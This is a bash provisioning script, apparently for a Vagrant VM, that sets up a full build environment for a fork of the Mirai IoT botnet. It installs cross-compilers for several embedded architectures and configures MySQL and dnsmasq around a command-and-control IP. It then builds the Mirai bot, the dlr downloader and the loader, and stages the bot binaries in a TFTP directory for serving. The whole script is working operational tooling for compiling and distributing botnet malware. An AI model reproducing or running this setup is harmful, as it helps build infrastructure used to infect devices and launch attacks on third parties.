#!/usr/bin/env bash

echo ">>> Installing packages... $[$(date +%s) - $(stat -c %Z /var/cache/apt/pkgcache.bin)]"
export DEBIAN_FRONTEND=noninteractive
if [ "$[$(date +%s) - $(stat -c %Z /var/cache/apt/pkgcache.bin)]" -ge 3 ]; then
  echo "apt-get update"
        apt-get update
fi
apt-get install -y git gcc electric-fence mysql-server mysql-client duende
mkdir -p /etc/maradns/logger/

curl -O https://storage.googleapis.com/golang/go1.11.1.linux-amd64.tar.gz
tar -C /usr/local -xzf go1.11.1.linux-amd64.tar.gz
mkdir -p ~/go; echo "export GOPATH=$HOME/go" >> ~/.bashrc
echo "export PATH=$PATH:$HOME/go/bin:/usr/local/go/bin" >> ~/.bashrc
source ~/.bashrc

# Mirai fork is included, no need to checkout
#
#if [ ! -d /vagrant/mirai ]; then
#  echo ">>> Cloning mirai repository..."
#  git clone https://github.com/James-Gallagher/Mirai.git /vagrant/mirai
#fi

if [ ! -d /etc/xcompile ]; then
  echo ">>> Installing crosscompilers..."
  mkdir /etc/xcompile
  cd /etc/xcompile
 
  COMPILERS="cross-compiler-armv4l cross-compiler-i586 cross-compiler-m68k cross-compiler-mips cross-compiler-mipsel cross-compiler-powerpc cross-compiler-sh4 cross-compiler-sparc"

  for compiler in $COMPILERS; do        
    wget -q https://www.uclibc.org/downloads/binaries/0.9.30.1/${compiler}.tar.bz2 --no-check-certificate
    if [ -f "${compiler}.tar.bz2" ]; then
      tar -jxf ${compiler}.tar.bz2
      rm ${compiler}.tar.bz2
      echo "export PATH=\$PATH:/etc/xcompile/$compiler/bin" >> ~/.mirairc
      echo ">> Compiler $compiler installed"
    else
      echo "!> Can not download $compiler"
    fi
  done

  echo "export PATH=\$PATH:/usr/local/go/bin" >> ~/.mirairc
  echo "export GOPATH=\$HOME/go" >> ~/.mirairc
  echo "source ~/.mirairc" >> ~/.bashrc

fi

echo ">>> Reloading mirairc..."
source ~/.mirairc

echo ">>> Getting go requirements..."
go get github.com/go-sql-driver/mysql
go get github.com/mattn/go-shellwords

echo ">>> Configuring sql..."
mysql < /vagrant/configs/setup_sql.sql

echo ">>> Configuring dnsmasq..."
mkdir -p /vagrant/tftp
if ps | grep dnsmasq ; then
  killall dnsmasq || true
fi
echo ">>> Preparing dnsmasq.conf, cnc server IP [$cnc_ip]"
cp /vagrant/configs/dnsmasq.conf /etc/dnsmasq.conf
cp /vagrant/configs/dnsmasqhosts /etc/dnsmasqhosts
cp /vagrant/configs/resolv.dnsmasq /etc/resolv.dnsmasq
sed -i "s|{cnc_ip}|$cnc_ip|g;" /etc/dnsmasq.conf
sed -i "s|{cnc_ip}|$cnc_ip|g;" /etc/dnsmasqhosts
dnsmasq

echo ">>> Building mirai bot and cnc..."
# process {DNS}
cp /vagrant/mirai/bot/resolv.cpp /vagrant/mirai/bot/resolv.c
DNS=$(echo "$cnc_ip" | sed -r 's/[.]/,/g')
sed -i "s|{DNS}|$DNS|g;" /vagrant/mirai/bot/resolv.c

# process {NI}
cp /vagrant/mirai/bot/const.hpp /vagrant/mirai/bot/const.h
sed -i "s|{NI}|$ni|g;" /vagrant/mirai/bot/const.h

# build debug
cd /vagrant/mirai/
./build.sh debug telnet

# build release
cd /vagrant/mirai/
./build.sh release telnet
cp /vagrant/mirai/release/mirai* /vagrant/tftp/

echo ">>> Building dlr..."
cd /vagrant/mirai/dlr
./build.sh
if ! [ -d /vagrant/mirai/loader/bins/ ]; then
  mkdir /vagrant/mirai/loader/bins
fi
cp /vagrant/mirai/dlr/release/* /vagrant/mirai/loader/bins/

echo ">>> Building loader..."
cd /vagrant/mirai/loader
./build.sh
/vagrant/mirai/reports/build.sh 

echo ">>> Done"
